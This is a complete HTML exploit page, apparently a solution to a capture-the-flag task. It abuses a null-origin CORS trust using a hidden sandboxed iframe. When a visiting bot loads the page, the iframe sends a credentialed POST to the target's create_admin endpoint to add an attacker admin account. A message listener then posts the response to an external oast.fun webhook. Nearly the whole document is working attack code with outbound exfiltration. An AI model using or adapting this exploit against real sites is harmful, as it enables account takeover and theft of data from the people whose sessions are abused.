<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Null Origin Exploit</title>
</head>
<body>

<iframe id="evil" 
        sandbox="allow-scripts" 
        style="width:1px;height:1px;border:none;position:absolute;left:-9999px;">
</iframe>

<script>
const iframe = document.getElementById('evil');

// Минимальный payload внутри srcdoc — Origin будет null
const innerHTML = `
<!DOCTYPE html>
<html>
<body>
<script>
async function exploit() {
  try {
    const resp = await fetch("https://tasks.goidactf.ru:20431/create_admin", {
      method: "POST",
      mode: "cors",
      credentials: "include",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "new_admin_login=hacker_null_1337"
    });

    let result = "";
    if (resp.ok) {
      result = await resp.text();
    } else {
      result = "STATUS_" + resp.status;
    }

    // Эксфильтрация через parent (postMessage работает с null → parent)
    parent.postMessage({
      type: "result",
      data: result,
      url: window.location.href,
      status: resp.status
    }, "*");

  } catch (err) {
    parent.postMessage({
      type: "error",
      message: err.message || "Unknown error"
    }, "*");
  }
}

exploit();
<\/script>
</body>
</html>
`;

iframe.srcdoc = innerHTML;

// Ловим сообщение от iframe
window.addEventListener("message", (event) => {
  // Можно добавить проверку event.origin === "" или null, но в практике часто просто *
  console.log("From iframe:", event.data);

  // Отправляем всё себе на webhook (mode: no-cors чтобы не словить CORS на webhook)
  fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
    method: "POST",
    mode: "no-cors",
    keepalive: true,
    body: JSON.stringify(event.data)
  });
});
</script>

<!-- Для дебага: просто видимый текст, чтобы понять, что страница загрузилась -->
<h1>Waiting for bot...</h1>

</body>
</html>
